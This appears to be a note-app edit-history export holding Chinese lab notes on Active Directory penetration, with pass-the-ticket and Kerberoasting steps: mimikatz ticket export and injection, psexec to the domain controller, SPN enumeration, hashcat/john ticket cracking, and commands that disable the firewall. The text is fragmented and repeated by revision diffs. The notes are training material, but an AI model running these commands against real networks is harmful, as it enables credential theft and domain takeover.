*/*\t\t\t#列出域内的spn服务主体名称，这条命令向域控查询信息，所以需要有域控服务器\n---\n\npowersploit中，脚本PowerView做信息搜集\nimport-module .\\PowerView.ps1\nGet-NetUser -SPN      \n---\n通过spn，申请service ticket服务票据\nAdd-Type -AssemblyName System.IdentityModel\nNew-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList \"MSSQLSvc/Srv-DB-0day.0day.org:1433\"\n---\n导出申请的服务票据\nmimikatz.exe \"kerberos::list /export\" exit\n导出的票据后缀名kirbi\n---\n爆破服务票据\npython tgsrepcrack.py test.txt 1.kirbi\n遇到错误，执行失败\n---\n从kirbi文件中提取出Kerberos tickets\npython /usr/share/john/kirbi2john.py 2-40a00000-jerry@MSSQLSvc~Srv-DB-0day.0day.org~1433-0DAY.ORG.kirbi > output.txt\n---\nhashcat -m 13100 output.txt /usr/share/wordlists/rockyou.txt --force\n```\n## windows不允许执行powershell\n运行powershell脚本时，遇到“无法加载文件，因为在此系统禁止执行脚本”\n\n在powershell面板下输入，`Set-ExecutionPolicy Unrestricted`，再输入“Y”，即可运行ps脚本\n\n## cmd关闭防火墙\n`NetSh Advfirewall` `set` `allprofiles state off`\n`Netsh Advfirewall show allprofiles`\n\nnetsh firewall set opmode mode=disable\n\n## 遇到的问题\n爆破服务票据密码的时候，py脚本提示\nImportError: No module named pyasn1.type\n\n安装一下模块， `pip install pyasn1`\n\n---\n运行这条命令的时候`python tgsrepcrack.py  test.txt 1.kirbi`\n提示：\n  File \"C:\\python27\\lib\\ntpath.py\", line 115, in splitdrive\n    if len(p) > 1:\nTypeError: object of type 'file' has no len()\n\n\nAttributeError: 'file' object has no attribute 'rfind'\n\n",[[1588480223561,["whale@Whale",[[1,2079," "]],[2079,2079],[2080,2080]]],[1588480223877,["whale@Whale",[[1,2081,"\n"]],[2080,2080],[2081,2081]]],[1588480226831,["whale@Whale",[[1,2081,"klist"]],[2081,2081],[2086,2086]]],[1588480227603,["whale@Whale",[[1,2087,"\n"]],[2086,2086],[2087,2087]]],[1588480227955,["whale@Whale",[[1,2088,"\n"]],[2087,2087],[2088,2088]]],[1588480229822,["whale@Whale",[[1,2088,"---"]],[2088,2088],[2091,2091]]],[1588480234741,["whale@Whale",[[1,2087,"查看内存中的票据"]],[2087,2087],[2095,2095]]],[1588500031134,["whale@Whale",[[1,2422,"。tgsrepcrack。"]],[2422,2422],[2435,2435]]],[1588500032150,["whale@Whale",[[-1,2434,"。"]],[2435,2435],[2434,2434]]],[1588500045001,["whale@Whale",[[1,2434,".py这个脚本从python2升级到了"]],[2434,2434],[2453,2453]]],[1588500054354,["whale@Whale",[[1,2423,"github上，"]],[2423,2423],[2431,2431]]],[1588500061097,["whale@Whale",[[1,2461,"python3不知道"]],[2461,2461],[2471,2471]]],[1588500062380,["whale@Whale",[[-1,2467,"3不知道"]],[2471,2471],[2467,2467]]],[1588500062645,["whale@Whale",[[1,2467,"，"]],[2467,2467],[2468,2468]]],[1588500063099,["whale@Whale",[[-1,2467,"，"]],[2468,2468],[2467,2467]]],[1588500064747,["whale@Whale",[[1,2467,"3，ye"]],[2467,2467],[2471,2471]]],[1588500065167,["whale@Whale",[[-1,2470,"e"]],[2471,2471],[2470,2470]]],[1588500068778,["whale@Whale",[[1,2469,"也许因此除了"]],[2469,2469],[2475,2475]]],[1588500069455,["whale@Whale",[[-1,2473,"除了"]],[2475,2475],[2473,2473]]],[1588500073457,["whale@Whale",[[1,2473,"出了bug。"]],[2473,2473],[2479,2479]]],[1588500306351,[null,[[-1,2479,"y"]],[2479,2479],[2479,2479]]],[1588500306351,[null,[[1,2479,"y"]],[2479,2479],[2479,2479]]],[1588500252145,["whale@Whale",[[1,2630,"\n"]],[2629,2629],[2630,2630]]],[1588500253384,["whale@Whale",[[1,2631,"\n"]],[2630,2630],[2631,2631]]],[1588500254057,["whale@Whale",[[-1,2631,"\n"]],[2631,2631],[2630,2630]]],[1588500254777,["whale@Whale",[[1,2630,"---"]],[2630,2630],[2633,2633]]],[1588500254944,["whale@Whale",[[1,2634,"\n"]],[2633,2633],[2634,2634]]],[1588500264633,["whale@Whale",[[1,2634,"爆破output.txt ，"]],[2634,2634],[2648,2648]]],[1588500265291,["whale@Whale",[[-1,2647,"，"]],[2648,2648],[2647,2647]]],[1588500270509,["whale@Whale",[[1,2634,"使用hashcat\\"]],[2634,2634],[2644,2644]]],[1588500271947,["whale@Whale",[[-1,2643,"\\"]],[2644,2644],[2643,2643]]],[1588500276154,["whale@Whale",[[1,2643,"或者johnthe"]],[2643,2643],[2652,2652]]],[1588500276914,["whale@Whale",[[-1,2649,"the"]],[2652,2652],[2649,2649]]],[1588500279978,["whale@Whale",[[1,2649," the rib"]],[2649,2649],[2657,2657]]],[1588500280395,["whale@Whale",[[-1,2656,"b"]],[2657,2657],[2656,2656]]],[1588500283197,["whale@Whale",[[1,2656,"pper,"]],[2656,2656],[2661,2661]]],[1588500284714,["whale@Whale",[[-1,2660,","]],[2661,2661],[2660,2660]]],[1588500285682,["whale@Whale",[[1,2660,"，"]],[2660,2660],[2661,2661]]],[1588511579364,[null,[[-1,2479,"y"],[1,2630,"\n"],[-1,2674,"\n"]],[2479,2479],[2674,2674]]],[1588511579365,[null,[[1,2479,"y"],[-1,2629,"\n"],[1,2674,"\n"]],[2674,2674],[2479,2479]]],[1588511559380,["whale@Whale",[[1,2675,"\n"]],[2674,2674],[2675,2675]]],[1588511560007,["whale@Whale",[[1,2676,"\n"]],[2675,2675],[2676,2676]]],[1588511564421,["whale@Whale",[[1,2676,"john --"]],[2676,2676],[2683,2683]]],[1588511639368,[null,[[-1,2479,"y"],[1,2630,"\n"],[-1,2683,"\n"]],[2479,2479],[2683,2683]]],[1588511639368,[null,[[1,2479,"y"],[-1,2629,"\n"],[1,2683,"\n"]],[2683,2683],[2479,2479]]],[1588511592289,["whale@Whale",[[1,2683,"–format=krb5tgs"]],[2683,2683],[2698,2698]]],[1588511593888,["whale@Whale",[[-1,2683,"–"]],[2684,2684],[2683,2683]]],[1588511700334,[null,[[-1,2479,"y"],[1,2630,"\n"],[-1,2697,"\n"]],[2479,2479],[2697,2697]]],[1588511700334,[null,[[1,2479,"y"],[-1,2629,"\n"],[1,2697,"\n"]],[2697,2697],[2479,2479]]],[1588511684107,["whale@Whale",[[1,2697," output.txt --wordlist=/usr/share/wordlists/rockyou.txt"]],[2697,2697],[2752,2752]]],[1588511688020,["whale@Whale",[[-1,2676,"john --format=krb5tgs output.txt --wordlist=/usr/share/wordlists/rockyou.txt"]],[2676,2752],[2676,2676]]],[1588511689907,["whale@Whale",[[1,2676,"john --format=krb5tgs output.txt --wordlist=/usr/share/wordlists/rockyou.txt"]],[2676,2676],[2752,2752]]],[1588511761371,[null,[[-1,2479,"y"],[1,2630,"\n"],[-1,2752,"\n"]],[2479,2479],[2752,2752]]],[1588511761371,[null,[[1,2479,"y"],[-1,2629,"\n"],[1,2752,"\n"]],[2752,2752],[2479,2479]]],[1588511713980,["whale@Whale",[[1,2630,"\n"]],[2629,2629],[2630,2630]]],[1588511715228,["whale@Whale",[[1,2631,"\n"]],[2630,2630],[2631,2631]]],[1588511717065,["whale@Whale",[[1,2631,"oup"]],[2631,2631],[2634,2634]]],[1588511717462,["whale@Whale",[[-1,2633,"p"]],[2634,2634],[2633,2633]]],[1588511722879,["whale@Whale",[[1,2633,"tput.txt的密码类型是Kerberos 5 TGS etype 23 [MD4 HMAC-MD5 RC4]"]],[2633,2633],[2689,2689]]]]],["5e10d297-02a1-4763-9b2c-a6c95bb04083",1588569065853,"域渗透入门（三）\n\n## 参考资料\n- 乌云文章：《域渗透——Pass The Hash & Pass The Key》、《域渗透——Pass The Ticket》、《从活动目录获取域管理员权限的各种姿势》\n- [https://medium.com/@t0pazg3m/pass-the-ticket-ptt-attack-in-mimikatz-and-a-gotcha-96a5805e257a](https://medium.com/@t0pazg3m/pass-the-ticket-ptt-attack-in-mimikatz-and-a-gotcha-96a5805e257a)\n- [https://resources.infosecinstitute.com/pass-hash-pass-ticket-no-pain/#gref](https://resources.infosecinstitute.com/pass-hash-pass-ticket-no-pain/#gref)\n- [https://blog.stealthbits.com/extracting-service-account-passwords-with-kerberoasting/](https://blog.stealthbits.com/extracting-service-account-passwords-with-kerberoasting/)\n- [https://blog.stealthbits.com/discovering-service-accounts-without-using-privileges/](https://blog.stealthbits.com/discovering-service-accounts-without-using-privileges/)\n- [域渗透——Kerberoasting](https://3gstudent.github.io/%E5%9F%9F%E6%B8%97%E9%80%8F-Kerberoasting/)\n- [什么是kerberoasting](https://attack.stealthbits.com/cracking-kerberos-tgs-tickets-using-kerberoasting)\n- [Kerberos协议探索系列之扫描与爆破篇：域环境和Kerberos协议的说明以及Kerberoasting的攻击方式](https://www.anquanke.com/post/id/171552#h3-5)\n\n## 录制的视频教程\n- [域渗透实践篇（四）](https://www.bilibili.com/video/BV1ve411s7Qd)\n1. pass the ticket\n\n- [域渗透实践篇（五）]()\n1. kerberoasting\n\n## ptt票据传递实践\npass the hash: 一把钥匙开所有的门锁\n\npass the ticket: 进入房间后，找到备用钥匙（高权限票据），以备用钥匙来开门。有效时间10小时，过期后可以重新导入内存。域内普通用户获得域管理员权限。\n\ndir \\\\OWA2010SP3\\C$\n\n```\nprivilege::debug\nsekurlsa::tickets /export\t\t  #导出内存中的票据\nkerberos::purge\n以上命令可以写成下面的形式\n\nmimikatz.exe \"privilege::debug\" \"sekurlsa::tickets /export\" exit\n\nmimikatz.exe \"privilege::debug\"  \"kerberos::ptt [0;3e4]-2-1-40e00000-SRV-DB-0DAY$@krbtgt-0DAY.ORG\" exit\n```\n### 获取到域管理员权限之后\n```\nnet time /domain \t\t#查域控的主机名\npsexec.exe \\\\OWA2010SP3 cmd.exe  \t\t#使用域控主机名，获得域管理员权限的cmd shell\n```\n## spn“服务主体名称”是什么\n服务帐户利用SPN支持Kerberos身份验证。也就是说，当客户端需要访问sever提供的服务的时候，那么就需要使用spn查询有哪些服务。\n\n这种spn扫描，是正常的，在内网中，客户端想要访问服务器的资源，都需要想DC域控查询服务主体名称。就好像上火车要查询列车编号一样。\n\n## 如何查询spn\n\n```\nsetspn -q */*\t\t\t#列出域内的spn服务主体名称，这条命令向域控查询信息，所以需要有域控服务器\n---\n\npowersploit中，脚本PowerView做信息搜集\nimport-module .\\PowerView.ps1\nGet-NetUser -SPN      \n--- \nklist\n查看内存中的票据\n---\n通过spn，申请service ticket服务票据\nAdd-Type -AssemblyName System.IdentityModel\nNew-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList \"MSSQLSvc/Srv-DB-0day.0day.org:1433\"\n---\n导出申请的服务票据\nmimikatz.exe \"kerberos::list /export\" exit\n导出的票据后缀名kirbi\n---\n爆破服务票据\npython tgsrepcrack.py test.txt 1.kirbi\n遇到错误，执行失败。github上，tgsrepcrack.py这个脚本从python2升级到了python3，也许因此出了bug。\n---\n从kirbi文件中提取出Kerberos tickets\npython /usr/share/john/kirbi2john.py 2-40a00000-jerry@MSSQLSvc~Srv-DB-0day.0day.org~1433-0DAY.ORG.kirbi > output.txt\n\noutput.txt的密码类型是Kerberos 5 TGS etype 23 [MD4 HMAC-MD5 RC4]\n---\n使用hashcat或者john the ripper，爆破output.txt \n\njohn --format=krb5tgs output.txt --wordlist=/usr/share/wordlists/rockyou.txt\n---\nhashcat -m 13100 output.txt /usr/share/wordlists/rockyou.txt --force\n```\n## windows不允许执行powershell\n运行powershell脚本时，遇到“无法加载文件，因为在此系统禁止执行脚本”\n\n在powershell面板下输入，`Set-ExecutionPolicy Unrestricted`，再输入“Y”，即可运行ps脚本\n\n## cmd关闭防火墙\n`NetSh Advfirewall` `set` `allprofiles state off`\n`Netsh Advfirewall show allprofiles`\n\nnetsh firewall set opmode mode=disable\n\n## 遇到的问题\n爆破服务票据密码的时候，py脚本提示\nImportError: No module named pyasn1.type\n\n安装一下模块， `pip install pyasn1`\n\n---\n运行这条命令的时候`python tgsrepcrack.py  test.txt 1.kirbi`\n提示：\n  File \"C:\\python27\\lib\\ntpath.py\", line 115, in splitdrive\n    if len(p) > 1:\nTypeError: object of type 'file' has no len()\n\n\nAttributeError: 'file' object has no attribute 'rfind'\n\n",[[1588569063922,["whale@Whale",[[1,8,"pass the ticket"]],[8,8],[23,23]]],[1588569105810,["whale@Whale",[[-1,468,"- [https://blog.stealthbits.com/extracting-service-account-passwords-with-kerberoasting/](https://blog.stealthbits.com/extracting-service-account-passwords-with-kerberoasting/)\n- [https://blog.stealthbits.com/discovering-service-accounts-without-using-privileges/](https://blog.stealthbits.com/discovering-service-accounts-without-using-privileges/)\n- [域渗透——Kerberoasting](https://3gstudent.github.io/%E5%9F%9F%E6%B8%97%E9%80%8F-Kerberoasting/)\n- [什么是kerberoasting](https://attack.stealthbits.com/cracking-kerberos-tgs-tickets-using-kerberoasting)\n- [Kerberos协议探索系列之扫描与爆破篇：域环境和Kerberos协议的说明以及Kerberoasting的攻击方式](https://www.anquanke.com/post/id/171552#h3-5)"]],[468,1125],[468,468]]],[1588569116518,["whale@Whale",[[-1,560,"- [域渗透实践篇（五）]()\n1. kerberoasting"]],[560,592],[560,560]]],[1588569123537,["whale@Whale",[[-1,561,"\n"]],[561,561],[560,560]]],[1588569124075,["whale@Whale",[[-1,560,"\n"]],[560,560],[559,559]]],[1588569125763,["whale@Whale",[[-1,469,"\n"]],[469,469],[468,468]]],[1588569156350,["whale@Whale",[[-1,1084,"## spn“服务主体名称”是什么\n服务帐户利用SPN支持Kerberos身份验证。也就是说，当客户端需要访问sever提供的服务的时候，那么就需要使用spn查询有哪些服务。\n\n这种spn扫描，是正常的，在内网中，客户端想要访问服务器的资源，都需要想DC域控查询服务主体名称。就好像上火车要查询列车编号一样。\n\n## 如何查询spn\n\n```\nsetspn -q */*\t\t\t#列出域内的spn服务主体名称，这条命令向域控查询信息，所以需要有域控服务器\n---\n\npowersploit中，脚本PowerView做信息搜集\nimport-module .\\PowerView.ps1\nGet-NetUser -SPN      \n--- \nklist\n查看内存中的票据\n---\n通过spn，申请service ticket服务票据\nAdd-Type -AssemblyName System.IdentityModel\nNew-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList \"MSSQLSvc/Srv-DB-0day.0day.org:1433\"\n---\n导出申请的服务票据\nmimikatz.exe \"kerberos::list /export\" exit\n导出的票据后缀名kirbi\n---\n爆破服务票据\npython tgsrepcrack.py test.txt 1.kirbi\n遇到错误，执行失败。github上，tgsrepcrack.py这个脚本从python2升级到了python3，也许因此出了bug。\n---\n从kirbi文件中提取出Kerberos tickets\npython /usr/share/john/kirbi2john.py 2-40a00000-jerry@MSSQLSvc~Srv-DB-0day.0day.org~1433-0DAY.ORG.kirbi > output.txt\n\noutput.txt的密码类型是Kerberos 5 TGS etype 23 [MD4 HMAC-MD5 RC4]\n---\n使用hashcat或者john the ripper，爆破output.txt \n\njohn --format=krb5tgs output.txt --wordlist=/usr/share/wordlists/rockyou.txt\n---\nhashcat -m 13100 output.txt /usr/share/wordlists/rockyou.txt --force\n```\n## windows不允许执行powershell\n运行powershell脚本时，遇到“无法加载文件，因为在此系统禁止执行脚本”\n\n在powershell面板下输入，`Set-ExecutionPolicy Unrestricted`，再输入“Y”，即可运行ps脚本\n\n## cmd关闭防火墙\n`NetSh Advfirewall` `set` `allprofiles state off`\n`Netsh Advfirewall show allprofiles`\n\nnetsh firewall set opmode mode=disable\n\n## 遇到的问题\n爆破服务票据密码的时候，py脚本提示\nImportError: No module named pyasn1.type\n\n安装一下模块， `pip install pyasn1`\n\n---\n运行这条命令的时候`python tgsrepcrack.py  test.txt 1.kirbi`\n提示：\n  File \"C:\\python27\\lib\\ntpath.py\", line 115, in splitdrive\n    if len(p) > 1:\nTypeError: object of type 'file' has no len()\n\n\nAttributeError: 'file' object has no attribute 'rfind'\n"]],[1084,2830],[1084,1084]]]]]]}